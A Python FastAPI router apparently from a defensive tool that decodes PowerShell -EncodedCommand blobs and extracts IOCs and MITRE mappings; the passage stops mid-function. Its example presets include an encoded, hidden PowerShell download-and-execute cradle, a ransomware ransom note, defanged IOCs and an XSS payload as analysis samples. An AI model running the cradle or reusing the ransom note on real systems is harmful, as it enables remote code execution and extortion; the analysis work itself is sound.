"""Operations router — /api/operations, /api/examples, /api/recipe/run, /api/upload,
                       /api/decode/smart, /api/decode/magic,
                       /api/analyze/command, /api/analyze/shellcode.
"""
from __future__ import annotations
import base64 as _b64
import hashlib
import logging
import os
import re
from typing import Any, Dict, List, Optional

from fastapi import APIRouter, Depends, File, HTTPException, UploadFile
from pydantic import BaseModel

from schemas import (
    RecipeStep, RunRecipeIn, RunRecipeOut, AutoIn, MagicIn,
    ShellcodeIn, CommandAnalyzeIn,
)
from deps import db, get_current_user, load_osint_keys
from operations import (
    OPERATIONS, list_operations, run_operation,
    detect_payload_type,
)
from smart_decoder import smart_decode
from magic_decoder import magic_decode
import models_studio as ms
from routers.helpers.decode_offload import run_offloaded

log = logging.getLogger("nivx.routers.ops")

router = APIRouter()


# ─── ADR-0012 · Progressive Partial Recovery ─────────────────────────────────
# When the PowerShell -EncodedCommand recovery chain fails but the decoder
# recovered a readable prefix (`partial_recovery.prefix_text`), run IOC /
# MITRE / LOLBin extraction on THAT PREFIX and return a "Partial Decode"
# verdict instead of a bare "Undetermined". Decoder invariants unchanged:
# no invented bytes, no stitched reconstruction. See:
#   /app/memory/adr/0012-progressive-partial-recovery.md
def _classify_partial_cause(partial_recovery: Dict[str, Any],
                             decode_report: Any) -> str:
    """§2.3 cause classification — deterministic, first-match wins.

    Truncation is the dominant signal when the decoder recovered a
    readable prefix — a non-empty `prefix_text` means bytes decoded
    cleanly up to a corruption point. Only downgrade to
    `nested_encoding` / `wrong_encoding` / `corrupted` when the
    decoder report explicitly identifies a distinct family (gzip
    body, encoding mismatch).
    """
    prefix_text = str(partial_recovery.get("prefix_text") or "")
    prefix_enc = str(partial_recovery.get("prefix_encoding") or "")
    possible_causes = tuple(getattr(decode_report, "possible_causes", []) or ())
    causes_blob = " ".join(possible_causes).lower()
    b64_reason = str(getattr(decode_report, "b64_reason", "") or "").lower()

    # Gzip family signal — deterministic, from decoder rules.
    if "gzip" in causes_blob or "deflate" in causes_blob:
        return "corrupted"
    # Encoding mismatch — prefix decoded as something other than UTF-16LE.
    if prefix_text and prefix_enc and prefix_enc != "utf-16-le":
        return "wrong_encoding"
    # Truncation dominates when we recovered readable bytes.
    if prefix_text:
        return "truncated"
    # No prefix + base64 rejection → unsupported.
    if "base64" in b64_reason and not prefix_text:
        return "unsupported"
    # No prefix but nested-family signal.
    if "nested" in causes_blob or "layer" in causes_blob:
        return "nested_encoding"
    return "unsupported"


def _run_progressive_analysis(
    *,
    partial_recovery: Dict[str, Any],
    decode_report: Any,
    blob_len: int,
) -> Optional[Dict[str, Any]]:
    """ADR-0012 §2.2 · Return a full decode/smart response envelope when the
    recovered prefix is usable, or None when the caller should fall back to
    the legacy `Undetermined` path (§2.2 gate: prefix must be ≥6 printable
    chars and contain ≥1 alpha).
    """
    prefix_text = str(partial_recovery.get("prefix_text") or "").strip()
    if len(prefix_text) < 6 or not any(c.isalpha() for c in prefix_text):
        return None

    # Progressive extractors — reuse existing rule-tables. No fabrication.
    from command_analyzer import (
        extract_iocs as _pa_extract_iocs,
        map_mitre as _pa_map_mitre,
        detect_lolbins as _pa_detect_lolbins,
        detect_interpreter as _pa_find_interpreter,
    )

    _iocs = _pa_extract_iocs(prefix_text)
    _mitre = _pa_map_mitre(prefix_text)
    _tokens = re.findall(r"[^\s]+", prefix_text)
    try:
        _interp = _pa_find_interpreter(prefix_text)
    except Exception:
        _interp = None
    _lolbins = _pa_detect_lolbins(_tokens, _interp)

    _cause = _classify_partial_cause(partial_recovery, decode_report)
    _enc = str(partial_recovery.get("prefix_encoding") or "utf-16-le")
    _off = int(partial_recovery.get("corruption_offset") or 0)
    _truncation_note = f"offset={_off}, encoding={_enc}"
    _confidence_band = str(getattr(decode_report, "confidence_band", "low") or "low")
    _recovered_layers = str(getattr(decode_report, "recovered_layers", "0/0") or "0/0")

    # ADR-0007 §2.3 severity floor — partial evidence caps at Suspicious.
    # Choose Suspicious iff we recovered ANY behavioral marker (LOLBin
    # or a defense-evasion MITRE technique); otherwise Partial Decode
    # reports at "Undetermined-with-partial-evidence" severity.
    _has_behavioral = bool(_lolbins) or any(
        (m.get("id") or "").startswith(("T1218", "T1059", "T1105", "T1140"))
        for m in _mitre
    )
    _severity_cap = "Suspicious" if _has_behavioral else "Undetermined"

    return {
        "recipe": [
            {"op": "ps-encodedcommand-recovery", "args": {},
             "reason": "PowerShell EncodedCommand deterministic decode"},
            {"op": "adr-0012-progressive-analysis", "args": {},
             "reason": "Recovered prefix analysed under §2.2 · Progressive Analysis"},
        ],
        "output": prefix_text,
        "output_raw": prefix_text,
        "notes": [
            "PowerShell -EncodedCommand blob detected — deterministic recovery chain executed.",
            (f"Base64 decoded ({getattr(decode_report, 'b64_bytes', 0)} bytes) but UTF-16LE "
             f"strict validation failed at byte offset "
             f"{getattr(decode_report, 'first_invalid_offset', 0)}."),
            (f"ADR-0012 · Progressive Analysis ran on the recovered prefix "
             f"({len(prefix_text)} chars, cause={_cause}). All derived evidence "
             f"is labeled `provenance: partial_recovery`."),
        ],
        "detected_type": {
            "type": "powershell_encoded_partial_decode",
            "label": "PowerShell -EncodedCommand blob — partial recovery analysed",
        },
        "engine": "adr-0012-progressive-analysis",
        "reached_shellcode": False,
        "confidence": _confidence_band,
        "score": None,
        "terminal": "partial-decode",
        "trace": [{
            "op": "adr-0012-progressive-analysis",
            "args": {
                "prefix_text_len": len(prefix_text),
                "cause": _cause,
                "confidence_band": _confidence_band,
                "recovered_layers": _recovered_layers,
                "truncation_note": _truncation_note,
                "severity_cap": _severity_cap,
                "extractors_ran": ["extract_iocs", "map_mitre", "detect_lolbins"],
            },
            "reason": "Recovered prefix analysed",
            "output_preview": prefix_text[:200],
            "output_length": len(prefix_text),
        }],
        "chain_ids": ["ps-encodedcommand-recovery", "adr-0012-progressive-analysis"],
        "iocs": {
            "ips": _iocs.get("ips", []),
            "urls": _iocs.get("urls", []),
            "domains": _iocs.get("domains", []),
            "emails": _iocs.get("emails", []),
            "file_paths": _iocs.get("file_paths", []),
            "bitcoin_addresses": [],
            "hashes": _iocs.get("hashes", {"md5": [], "sha1": [], "sha256": []}),
            # ADR-0012 §2.4 · every IOC carries partial-recovery provenance.
            "provenance": "partial_recovery",
            "truncation_note": _truncation_note,
        },
        "mitre": [
            {**hit, "provenance": "partial_recovery", "truncation_note": _truncation_note}
            for hit in _mitre
        ],
        "lolbas": [
            {**hit, "provenance": "partial_recovery", "truncation_note": _truncation_note}
            for hit in _lolbins
        ],
        "tradecraft": [],
        "verdict": "partial_decode",
        "verdict_display": "Partial Decode",
        "confidence_band": _confidence_band,
        "recovered_layers": _recovered_layers,
        "verdict_card": {
            "verdict": "partial_decode",
            "verdict_display": "Partial Decode",
            "risk_score": None,
            "score": None,
            "confidence": _confidence_band,
            "confidence_band": _confidence_band,
            "recovered_layers": _recovered_layers,
            "severity_cap": _severity_cap,
            "headline": (
                "Partial Decode — recovered prefix analysed"
                if _has_behavioral else
                "Partial Decode — no behavioral evidence in recovered prefix"
            ),
            "why": (
                f"Base64 decoded ({getattr(decode_report, 'b64_bytes', 0)} bytes) but "
                f"UTF-16LE strict validation failed at byte offset "
                f"{getattr(decode_report, 'first_invalid_offset', 0)}. "
                f"The readable prefix ({len(prefix_text)} chars) was analysed under "
                f"ADR-0012 §2.2 · cause={_cause}. Severity capped at {_severity_cap} "
                f"because behavioral evidence is definitionally incomplete."
            ),
            "provenance": "partial_recovery",
            "cause": _cause,
        },
        "cause": _cause,
        "partial_recovery": dict(partial_recovery),
        "decode_error": {
            "status": getattr(decode_report, "status", "decode_error"),
            "b64_bytes": getattr(decode_report, "b64_bytes", 0),
            "b64_status": getattr(decode_report, "b64_status", ""),
            "b64_reason": getattr(decode_report, "b64_reason", ""),
            "first_invalid_offset": getattr(decode_report, "first_invalid_offset", 0),
            "invalid_reason": getattr(decode_report, "invalid_reason", ""),
            "hex_preview": getattr(decode_report, "hex_preview", ""),
            "possible_causes": list(getattr(decode_report, "possible_causes", []) or []),
            "attempts": [a.to_dict() for a in getattr(decode_report, "attempts", []) or []],
            "blob_length": blob_len,
            "partial_recovery": dict(partial_recovery),
            "confidence_band": _confidence_band,
            "confidence_reason": getattr(decode_report, "confidence_reason", ""),
            "recovered_layers": _recovered_layers,
            "cause": _cause,
        },
        "custom_recipes_matched": [],
    }
# ─────────────────────────────────────────────────────────────────────────────


# --- Load Example Presets (moved from server.py) --------------------------- #
EXAMPLES = [
    {
        "id": "powershell-encoded",
        "label": "PowerShell -EncodedCommand",
        "input": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAvAHAALgBwAHMAMQAnACkA",
    },
    {
        "id": "ransomware-note",
        "label": "Ransomware Note",
        "input": "!!! YOUR FILES HAVE BEEN ENCRYPTED !!!\nAll your important documents, photos, databases and other files have been encrypted with military-grade AES-256.\n\nTo restore your files you must pay 0.75 BTC to the following address within 72 hours:\n\nBTC ADDRESS: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\n\nContact us via Tor: http://ransomxyz1abcdef23456789ghijklmn.onion\nEmail: recover-your-files@protonmail.com\n\nDo NOT rename encrypted files. Do NOT try to decrypt with third-party software.\n",
    },
    {
        "id": "defanged-iocs",
        "label": "Defanged IOCs Bundle",
        "input": "IOC dump from IR ticket #4421:\n\nURLs:\n  hxxps://malicious-cdn[.]example[.]com/payload[.]exe\n  hxxp://phish[.]login-microsoft-secure[.]net/auth\n\nIPs:\n  185[.]220[.]101[.]45\n  45[.]137[.]21[.]9\n\nEmails:\n  attacker[@]evilcorp[.]ru\n  admin[@]phish[.]login-microsoft-secure[.]net\n\nHashes:\n  MD5:    e10adc3949ba59abbe56e057f20f883e\n  SHA256: 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n",
    },
    {
        "id": "nested-base64-gzip",
        "label": "Nested Base64 → gzip",
        "input": "H4sIAIQ5VWoC/xXKyRWAIAwFwFZ+A3ryWYkNBBIRF4LEvXr1PNMNgnWPfoIreib0emHcl2zQQwq2j2d6brCGGt0QDZnuWYlxkiE8MVdel1zETPjvCY5M2qaS5JWF6xdjITdRYgAAAA==",
    },
    {
        "id": "url-encoded-xss",
        "label": "URL-encoded XSS",
        "input": "%3Cscript%3Ealert(String.fromCharCode(88%2C83%2C83))%3C%2Fscript%3E",
    },
]


# --- File upload helpers --------------------------------------------------- #
def _detect_file_type(raw: bytes, filename: str) -> Dict[str, str]:
    magics = [
        (b"MZ", "PE (Windows executable / DLL)", "application/x-dosexec"),
        (b"\x7fELF", "ELF (Linux executable)", "application/x-elf"),
        (b"\xCA\xFE\xBA\xBE", "Java class / Mach-O fat", "application/java-vm"),
        (b"\xFE\xED\xFA", "Mach-O binary", "application/x-mach-binary"),
        (b"PK\x03\x04", "ZIP archive (docx/xlsx/jar/apk possible)", "application/zip"),
        (b"Rar!\x1a\x07", "RAR archive", "application/vnd.rar"),
        (b"\x1f\x8b", "GZIP compressed", "application/gzip"),
        (b"\x42\x5a\x68", "BZIP2 compressed", "application/x-bzip2"),
        (b"\xFD7zXZ", "XZ compressed", "application/x-xz"),
        (b"%PDF-", "PDF document", "application/pdf"),
        (b"\xD0\xCF\x11\xE0", "MS OLE compound (legacy Office / MSI)", "application/x-ole"),
        (b"\x89PNG", "PNG image", "image/png"),
        (b"\xff\xd8\xff", "JPEG image", "image/jpeg"),
        (b"GIF87a", "GIF image", "image/gif"),
        (b"GIF89a", "GIF image", "image/gif"),
        (b"#!/", "Shell script (shebang)", "text/x-shellscript"),
        (b"<?xml", "XML document", "application/xml"),
        (b"{\"", "JSON (likely)", "application/json"),
    ]
    for prefix, label, mime in magics:
        if raw.startswith(prefix):
            return {"label": label, "mime": mime, "extension": _ext(filename)}
    if _mostly_printable(raw[:2048].decode("utf-8", errors="replace")):
        return {"label": "Plain text", "mime": "text/plain", "extension": _ext(filename)}
    return {"label": "Unknown binary", "mime": "application/octet-stream", "extension": _ext(filename)}


def _ext(filename: str) -> str:
    if "." not in filename: return ""
    return filename.rsplit(".", 1)[-1].lower()


def _mostly_printable(s: str, threshold: float = 0.85) -> bool:
    if not s: return False
    printable = sum(1 for c in s if c.isprintable() or c in "\n\r\t")
    return printable / max(1, len(s)) >= threshold


def _hex_dump(data: bytes, width: int = 16) -> str:
    lines = []
    for i in range(0, len(data), width):
        chunk = data[i:i + width]
        hex_part = " ".join(f"{b:02x}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        lines.append(f"{i:08x}  {hex_part:<{width * 3}}  {ascii_part}")
    return "\n".join(lines)


def _extract_strings(raw: bytes, min_len: int = 4, limit: int = 400) -> List[str]:
    out, cur = [], []
    for b in raw:
        if 32 <= b < 127:
            cur.append(chr(b))
        else:
            if len(cur) >= min_len:
                out.append("".join(cur))
                if len(out) >= limit: break
            cur = []
    if len(cur) >= min_len and len(out) < limit:
        out.append("".join(cur))
    return out


# --- Endpoints ------------------------------------------------------------- #
@router.get("/operations")
async def get_ops(user=Depends(get_current_user)):
    return list_operations()


@router.get("/examples")
async def get_examples(user=Depends(get_current_user)):
    return EXAMPLES


@router.post("/recipe/run", response_model=RunRecipeOut)
async def run_recipe(body: RunRecipeIn, user=Depends(get_current_user)):
    # v1.5.6 · Offload the whole recipe replay onto a thread executor.
    # A single recipe can chain 10+ ops including xor-brute/L3 that
    # each hold the GIL for seconds. Running the full loop off-loop
    # keeps `/api/health` responsive throughout.
    def _replay():
        current = body.input
        steps_output: List[Dict[str, Any]] = []
        errors: List[Dict[str, str]] = []
        for i, step in enumerate(body.steps):
            try:
                nxt = run_operation(step.op, current, step.args)
                current = nxt
                steps_output.append({
                    "index": i, "op": step.op,
                    "output_preview": current[:400],
                    "output_length": len(current),
                })
            except Exception as e:
                errors.append({"index": str(i), "op": step.op, "error": str(e)})
                steps_output.append({"index": i, "op": step.op, "error": str(e)})
                break
        return current, steps_output, errors

    current, steps_output, errors = await run_offloaded(_replay)
    return RunRecipeOut(
        output=current, steps_output=steps_output,
        detected_type=detect_payload_type(current), errors=errors,
    )


@router.post("/upload")
async def upload(file: UploadFile = File(...), user=Depends(get_current_user)):
    """Universal file upload — accepts ANY file format."""
    raw = await file.read()
    size = len(raw)
    hashes = {
        "md5": hashlib.md5(raw).hexdigest(),
        "sha1": hashlib.sha1(raw).hexdigest(),
        "sha256": hashlib.sha256(raw).hexdigest(),
    }
    file_type = _detect_file_type(raw, file.filename or "")
    text = None
    try:
        candidate = raw.decode("utf-8")
        if _mostly_printable(candidate):
            text = candidate
    except UnicodeDecodeError:
        pass
    if text is None:
        try:
            candidate = raw.decode("utf-16-le")
            if _mostly_printable(candidate):
                text = candidate
        except UnicodeDecodeError:
            pass
    hex_dump = _hex_dump(raw[:512])
    strings_out = _extract_strings(raw, min_len=4, limit=400)
    if text is not None:
        content = text[:400_000]
    else:
        content = (
            f"[BINARY FILE — {file.filename}]\n"
            f"Size: {size} bytes\n"
            f"Type: {file_type['label']}\n"
            f"MD5:    {hashes['md5']}\n"
            f"SHA1:   {hashes['sha1']}\n"
            f"SHA256: {hashes['sha256']}\n\n"
            f"── HEX DUMP (first 512 bytes) ──\n{hex_dump}\n\n"
            f"── EXTRACTED STRINGS (top {min(200, len(strings_out))}) ──\n"
            + "\n".join(strings_out[:200])
        )
    return {
        "filename": file.filename, "size": size,
        "hashes": hashes, "file_type": file_type,
        "text": text[:400_000] if text else None,
        "hex_dump": hex_dump, "strings": strings_out, "content": content,
    }


@router.post("/decode/magic")
async def decode_magic(body: MagicIn, user=Depends(get_current_user)):
    """Recursive multi-branch auto-decoder — returns top-N candidate chains + scores."""
    # v1.5.6 · magic_decode explores up to `max_branches × max_depth`
    # decoder combinations synchronously; on tier_0 this can easily
    # exceed 20s and block `/api/health`. Offload to thread executor.
    return await run_offloaded(
        magic_decode,
        body.input,
        max_depth=body.max_depth,
        max_branches=body.max_branches,
        top_n=body.top_n,
    )


@router.post("/analyze/command")
async def analyze_command_endpoint(body: CommandAnalyzeIn, user=Depends(get_current_user)):
    """Intelligent Command-Line Analysis Engine — semantic parsing first."""
    from command_analyzer import analyze_command as _ac
    # v1.5.6 · analyzer chains xor-brute internally for defanged decode —
    # same starvation risk, same offload treatment.
    return await run_offloaded(
        _ac, body.input, force_decode_span=body.force_decode_span,
    )


@router.post("/analyze/shellcode")
async def analyze_shellcode(body: ShellcodeIn, user=Depends(get_current_user)):
    """Shellcode / binary analysis — auto-detects arch, disassembles via Capstone."""
    from shellcode_analyzer import analyze as _analyze_shellcode
    raw_in = body.input.strip()
    data: bytes = b""
    src = "utf8"
    hex_stripped = re.sub(r"[\s:]", "", raw_in)
    if hex_stripped and len(hex_stripped) % 2 == 0 and re.fullmatch(r"[0-9a-fA-F]+", hex_stripped):
        try:
            data = bytes.fromhex(hex_stripped)
            src = "hex"
        except Exception:
            data = b""
    if not data:
        try:
            b64 = re.sub(r"\s+", "", raw_in)
            data = _b64.b64decode(b64 + "=" * (-len(b64) % 4), validate=False)
            if data:
                src = "base64"
        except Exception:
            data = b""
    if not data:
        data = raw_in.encode("utf-8", errors="replace")
        src = "utf8"
    # v1.5.6 · Capstone disassembly is C-extension (releases GIL) but
    # the pre-analysis extract-strings + arch-heuristic pass is pure
    # Python and can stall on large payloads. Offload the whole thing.
    result = await run_offloaded(
        _analyze_shellcode, data, arch=body.arch, max_insns=body.max_insns,
    )
    result["input_source"] = src
    result["input_bytes"] = len(data)
    return result


async def _decode_multi_fragment(fragments: List[str], body: AutoIn, user) -> Dict[str, Any]:
    """Decode each fragment via `/api/decode/smart` internally and merge.

    Fragment-mode is triggered by:
      * `<br>` HTML line breaks (Kibana / Sentinel exports)
      * ≥ 2 `-Enc <b64>` / `-EncodedCommand <b64>` blocks in one paste

    Produces a merged response with:
      * `output`     — labelled per-fragment decoded outputs joined by
                       clear stage boundaries
      * `chain_ids`  — union of every fragment's chain
      * `mitre`      — deduped union
      * `lolbas`     — deduped union (by binary name)
      * `iocs`       — merged (urls/ips/domains/hashes)
      * `risk`       — max severity across fragments
      * `fragments`  — per-fragment breakdown for the UI
    """
    from analysis_core import deterministic_best_decode
    from operations import extract_iocs, mitre_map
    from lolbas import scan_lolbas

    per_fragment: List[Dict[str, Any]] = []
    merged_output_parts: List[str] = []
    merged_chain: List[str] = []
    merged_mitre_by_id: Dict[str, Dict[str, Any]] = {}
    merged_lolbas_by_bin: Dict[str, Dict[str, Any]] = {}
    merged_iocs: Dict[str, set] = {}
    max_score = 0
    max_verdict = "Undecoded"

    _SEVERITY_ORDER = {"Undecoded": 0, "Benign": 1, "Corrupted": 2, "Suspicious": 3, "Malicious": 4, "Unknown": 0}

    for idx, frag in enumerate(fragments, 1):
        try:
            # v1.5.6 · offload per-fragment decode so multi-fragment
            # requests don't compound event-loop blocking.
            det = await run_offloaded(
                deterministic_best_decode,
                frag,
                analysis_mode=body.analysis_mode or "balanced",
            )
        except HTTPException:
            raise
        except Exception as e:
            det = {"output": frag, "steps": [], "score": 0.0, "engine": "error", "notes": [f"decode error: {e}"]}
        f_out = det.get("output") or ""
        f_steps = [s["op"] for s in det.get("steps") or []]
        # Enrichment on input+output
        f_scan = frag + "\n" + f_out
        try:
            f_iocs = extract_iocs(f_scan) or {}
        except Exception:
            f_iocs = {}
        try:
            f_mitre = mitre_map(f_scan) or []
        except Exception:
            f_mitre = []
        try:
            f_lolbas = scan_lolbas(f_scan) or []
        except Exception:
            f_lolbas = []

        # Verdict card per fragment (best-effort)
        try:
            from evidence_extractor import build_verdict_card
            f_vc = build_verdict_card(
                input_text=frag, output_text=f_out,
                chain=[{"op": s["op"], "args": s.get("args") or {}} for s in det.get("steps") or []],
                corrupted_container=det.get("corrupted_container"),
            )
        except Exception:
            f_vc = None
        f_score = int((f_vc or {}).get("confidence") or 0)
        f_verdict = ((f_vc or {}).get("label") or "Unknown").strip()

        per_fragment.append({
            "index":       idx,
            "input":       frag[:400],
            "output":      f_out,
            "chain_ids":   f_steps,
            "engine":      det.get("engine"),
            "mitre":       f_mitre,
            "lolbas":      f_lolbas,
            "iocs":        f_iocs,
            "risk":        {"verdict": f_verdict, "level": f_verdict.lower(), "score": f_score},
            "verdict_card": f_vc,
        })

        # Merge chain
        merged_chain.extend(f_steps)
        # Merge MITRE (by id)
        for m in f_mitre:
            mid = (m.get("id") if isinstance(m, dict) else None) or (m if isinstance(m, str) else None)
            if mid and mid not in merged_mitre_by_id:
                merged_mitre_by_id[mid] = m if isinstance(m, dict) else {"id": mid}
        # Merge LOLBAS (by binary)
        for l in f_lolbas:
            key = (l.get("binary") if isinstance(l, dict) else None) or (l if isinstance(l, str) else None)
            if key and key not in merged_lolbas_by_bin:
                merged_lolbas_by_bin[key] = l if isinstance(l, dict) else {"binary": key}
        # Merge IOCs
        for k, v in f_iocs.items():
            if isinstance(v, list):
                merged_iocs.setdefault(k, set()).update(v)
        # Max verdict
        if _SEVERITY_ORDER.get(f_verdict, 0) > _SEVERITY_ORDER.get(max_verdict, 0):
            max_verdict = f_verdict
        max_score = max(max_score, f_score)

        # Build labelled output block
        header = f"── Fragment {idx}/{len(fragments)} · engine={det.get('engine')} · risk={f_verdict}({f_score}) ──"
        merged_output_parts.append(header)
        merged_output_parts.append(f"INPUT : {frag[:200]}{'…' if len(frag) > 200 else ''}")
        merged_output_parts.append("DECODED:")
        merged_output_parts.append(f_out or "(no decoded content)")
        merged_output_parts.append("")

    merged_output = "\n".join(merged_output_parts).rstrip()
    merged_iocs_out = {k: sorted(v) for k, v in merged_iocs.items()}

    return {
        "engine":           "multi-fragment",
        "output":           merged_output,
        "output_raw":       merged_output,
        "recipe":           [{"op": op, "args": {}, "reason": f"multi-fragment step"} for op in merged_chain],
        "chain_ids":        merged_chain,
        "score":            max_score,
        "confidence":       max_score,
        "reached_shellcode": any((f.get("risk") or {}).get("level") == "malicious" for f in per_fragment),
        "risk":             {"verdict": max_verdict, "level": max_verdict.lower(), "score": max_score},
        "mitre":            list(merged_mitre_by_id.values()),
        "lolbas":           list(merged_lolbas_by_bin.values()),
        "iocs":             merged_iocs_out,
        "fragments":        per_fragment,
        "fragment_count":   len(fragments),
        "notes":            [f"Multi-fragment mode: split {len(fragments)} payloads (HTML <br> and/or repeated -Enc detected)"],
        "detected_type":    "multi-fragment",
        "analysis_mode":    body.analysis_mode or "balanced",
        "custom_recipes_matched": [],
        "trace":            [],
    }


@router.post("/decode/smart")
async def decode_smart(body: AutoIn, user=Depends(get_current_user)):
    """Custom recipe match first, else deterministic BEST-of {smart, magic}.

    Feb-2026 upgrade: previously used only greedy `smart_decode`, which stopped
    at the loader-script layer on multi-layer stagers. Now uses
    `deterministic_best_decode` (smart+magic race) so this endpoint reaches the
    SAME terminal state as the MAGIC button on every supported payload.

    Feb 2026 v1.3.1: multi-fragment auto-split. When the input contains HTML
    line breaks (`<br>`) OR multiple `-Enc <b64>` / `powershell` / `cmd`
    fragments on separate lines, we split, decode each independently, and
    return a MERGED output — so pasting a Kibana / Sentinel `<br>`-joined
    log dump shows every decoded fragment, not just the first.
    """
    from analysis_core import deterministic_best_decode

    # ═══════════════════════════════════════════════════════════════════
    # ADR-0014 · Phase 2 · Ingress Normalisation Gate (Layer 1 · §1.1.14).
    # If the input is vendor JSON telemetry (Cisco Secure Endpoint /
    # XDR / CrowdStrike / Defender / QRadar / Splunk / SentinelOne /
    # Sysmon), normalise into a canonical event stream BEFORE any
    # downstream IOC / MITRE / verdict extractor runs. Schema URLs
    # (CRL distribution points, AMP console URLs, XDR API endpoints)
    # never reach an extractor — they are not indicators of compromise.
    # API contract (§1.1.15) is preserved: response shape unchanged.
    # ═══════════════════════════════════════════════════════════════════
    _ingress_provenance: str | None = None
    _original_raw_input: str = body.input or ""
    try:
        from nivxforge.investigation.ingress_gate import apply_ingress_gate as _apply_gate
        _gate = _apply_gate(body.input or "")
        if _gate.was_vendor_json:
            body.input = _gate.text
            _ingress_provenance = _gate.normalised_via
    except Exception:  # noqa: BLE001
        # Never break the endpoint on gate failure — degrade to raw input.
        log.exception("ADR-0014 · ingress gate failed (safe — raw input preserved)")

    # ── Atomic-IOC guard (v1.3.2 · 2026-07-29) ─────────────────
    # Bare filenames / URLs / IPs / domains / paths / registry keys /
    # hashes are NOT decoding candidates. Applying XOR/ROT/base64
    # brute-force on a bare filename produces meaningless output like
    # "sc|nc%ini" and a fabricated "Suspicious xor→rot-n" verdict.
    # Short-circuit the WHOLE legacy chain-decode for these — the
    # Investigation Brain will still attach an "atomic IOC · no
    # decoding required" report below via the additive
    # ``investigation`` field. Never breaks well-formed adversarial
    # inputs (multi-line, spaces, or non-IOC shapes).
    try:
        from v2.investigation.pipeline import _atomic_ioc_kind
        _atomic_kind = _atomic_ioc_kind(body.input or "")
    except Exception:
        _atomic_kind = None
    if _atomic_kind is not None:
        from v2.investigation.pipeline import investigate as _inv
        _res = _inv(body.input or "")
        # ── ARB PR-2.1.2 · always attach canonical_artifact ──
        # Atomic IOCs still get a canonical artifact (terminal_state=
        # 'atomic_ioc') so `/api/analyze/async` and `/api/decode/smart`
        # remain byte-identical on this input path. The shared service
        # produces the correct atomic_ioc terminal state on its own.
        try:
            from services.canonical_evidence_recovery import (
                recover_canonical_evidence_async,
            )
            _atomic_art = await recover_canonical_evidence_async(
                body.input or "",
                analysis_mode=body.analysis_mode or "balanced",
            )
            _atomic_ca = _atomic_art.to_dict()
        except Exception:
            _atomic_ca = None
        return {
            "recipe": [
                {"op": "atomic-ioc-passthrough", "args": {},
                 "reason": f"Input is a bare {_atomic_kind} — no decoding applicable"}
            ],
            "output": body.input,
            "input": body.input,
            "confidence": 100,
            "confidence_source": "atomic_ioc_guard",
            "trace": [{
                "op": "atomic-ioc-passthrough",
                "in":  body.input,
                "out": body.input,
                "reason": (f"Input classified as bare {_atomic_kind}. "
                           "Legacy chain-decode skipped — atomic IOCs are "
                           "surfaced as-is and cannot be brute-forced into "
                           "meaningful plaintext."),
            }],
            "atomic_ioc": {"kind": _atomic_kind, "value": (body.input or "").strip()},
            "semantic": {},
            "investigation": _res.to_dict(),
            "canonical_artifact": _atomic_ca,
        }

    # ── PowerShell -EncodedCommand deterministic short-circuit (Jul-2026) ──
    # Locked with SOC user 2026-07-25: when the input is a
    # `powershell.exe … -EncodedCommand <BLOB>` invocation whose blob
    # FAILS the deterministic recovery chain, return a structured
    # `decode_error` response IMMEDIATELY. This prevents:
    #   • xor-brute running 4× on corrupted UTF-16LE bytes,
    #   • the OUTPUT panel rendering latin-1 garbage,
    #   • the Investigation Summary fabricating a "Malicious 70/100" verdict.
    # On successful recovery this preamble is a no-op — the legacy
    # deterministic pipeline runs unchanged.
    try:
        _ps_enc_m = re.search(
            r"powershell(?:\.exe)?[^\n]*?\-e(?:nc|c|ncodedcommand)?\s+"
            r"([A-Za-z0-9+/=]{16,})",
            body.input or "", re.IGNORECASE,
        )
        if _ps_enc_m:
            from v2.semantic.ps_recovery import recover_powershell_from_b64
            _blob = _ps_enc_m.group(1).strip("= ").rstrip("=")
            _blob = _blob + "=" * ((-len(_blob)) % 4)
            _rep = recover_powershell_from_b64(_blob)
            if _rep.status == "decode_error":
                # ── ADR-0012 · Progressive Partial Recovery ──────────────
                # If the decoder recovered a readable prefix, run IOC /
                # MITRE / LOLBin extraction on it and switch the verdict
                # from `decode_error` / `Undetermined` to `partial_decode`
                # / `Partial Decode`. Severity is capped at Suspicious
                # (§2.2) and every derived evidence item carries
                # `provenance: partial_recovery`. Decoder invariants are
                # unchanged — we NEVER stitch reconstructed bytes.
                _pa_pipeline = _run_progressive_analysis(
                    partial_recovery=dict(_rep.partial_recovery or {}),
                    decode_report=_rep,
                    blob_len=len(_blob),
                )
                if _pa_pipeline is not None:
                    return _pa_pipeline
                # ── ARB PR-2.1.2 · always attach canonical_artifact ──
                try:
                    from services.canonical_evidence_recovery import (
                        recover_canonical_evidence_async,
                    )
                    _pse_art = await recover_canonical_evidence_async(
                        body.input or "",
                        analysis_mode=body.analysis_mode or "balanced",
                    )
                    _pse_ca = _pse_art.to_dict()
                except Exception:
                    _pse_ca = None
                return {
                    "recipe": [
                        {"op": "ps-encodedcommand-recovery", "args": {},
                         "reason": "PowerShell EncodedCommand deterministic decode"}
                    ],
                    "output": "",   # explicit — NEVER leak binary garbage
                    "output_raw": "",
                    "notes": [
                        "PowerShell -EncodedCommand blob detected — deterministic recovery chain executed.",
                        (f"Base64 decoded ({_rep.b64_bytes} bytes) but UTF-16LE strict "
                         f"validation failed at byte offset {_rep.first_invalid_offset}: "
                         f"{_rep.invalid_reason}."),
                        "Downstream decoders (xor-brute, etc.) intentionally skipped.",
                    ],
                    "detected_type": {
                        "type":  "powershell_encoded_decode_error",
                        "label": ("PowerShell -EncodedCommand blob detected — "
                                  "recovery chain failed"),
                    },
                    "engine": "ps-encodedcommand-recovery",
                    "reached_shellcode": False,
                    "confidence": None,   # explicit — never imply benign
                    "score": None,
                    "terminal": "decode-error",
                    "trace": [{
                        "op": "ps-encodedcommand-recovery",
                        "args": {
                            "decode_error":         True,
                            "b64_bytes":            _rep.b64_bytes,
                            "b64_status":           _rep.b64_status,
                            "b64_reason":           _rep.b64_reason,
                            "first_invalid_offset": _rep.first_invalid_offset,
                            "invalid_reason":       _rep.invalid_reason,
                            "hex_preview":          _rep.hex_preview,
                            "possible_causes":      list(_rep.possible_causes),
                            "recovery_attempts":    [a.to_dict() for a in _rep.attempts],
